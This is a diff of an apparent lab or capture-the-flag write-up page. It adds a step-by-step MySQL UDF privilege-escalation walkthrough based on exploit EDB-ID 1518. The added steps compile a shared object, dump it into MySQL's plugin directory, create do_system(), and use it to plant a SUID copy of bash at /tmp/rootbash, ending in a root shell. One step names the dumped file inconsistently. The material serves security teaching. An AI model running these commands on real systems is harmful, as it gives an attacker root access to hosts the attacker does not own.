@@ -66,9 +66,44 @@
 +---------------------------------------------------------------------+
 | GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
 +---------------------------------------------------------------------+</code></pre>
-                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a>.</p>
-                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
-
+                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518).</p>
+                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518) leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
+                <p>Navigate to the "/tmp" directory and create a file to hold the UDF exploit code.</p>
+                <pre><code>user@debian:/tmp$ nano exploit_udf.c</code></pre>
+                <p>Paste the exploit code into the file, ensure it is copied exactly, as any syntax errors will casue issues during compilation. Once you have saved the file, compile it using <strong>gcc</strong> to produce a shared object (.so) file:</p>
+                <pre><code>user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc</code></pre>
+                <p>Connect to the MySQL server and switch to the <strong>MySQL</strong> system database:</p>
+                <pre><code>mysql> use mysql
+Reading table information for completion of table and columns names
+You can turn off this feature to get a quicker startup with -A
+                
+Database changed
+mysql> </code></pre>
+                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
+                <pre><code>mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.01 sec)</code></pre>
+                <p>Load the shared object file we created eariler in to the table, "foo":</p>
+                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
+Query OK, 1 row affected (0.00 sec)</code></pre>
+                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
+                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit.so';
+Query OK, 1 row affected (0.00 sec)</code></pre>
+                <p>Create a custom MySQL function called "do_system" that will be available for use in SQL queries. The "soname" directive tells MySQL to load the function from the shared library "exploit_udf.so":</p>
+                <pre><code>mysql> create function do_system returns integer soname 'exploit_udf.so';
+Query OK, 0 rows affected (0.00 sec)</code></pre>
+                <p>Use the custom function to copy the "/bin/bash" binary to "/tmp/rootbash", and set the SUID bit so we can run it as root, the creator of the file, also make it executable:</p>
+                <pre><code>mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
++---------------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
++---------------------------------------------------------------------+
+|                                                                   0 |
++---------------------------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the eariler steps of our attack).</p>
+                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
+rootbash-4.1# whoami
+root</code></pre>
+                <p><strong>Congratulations, you own the system!</strong></p>
                 
             </section>
 
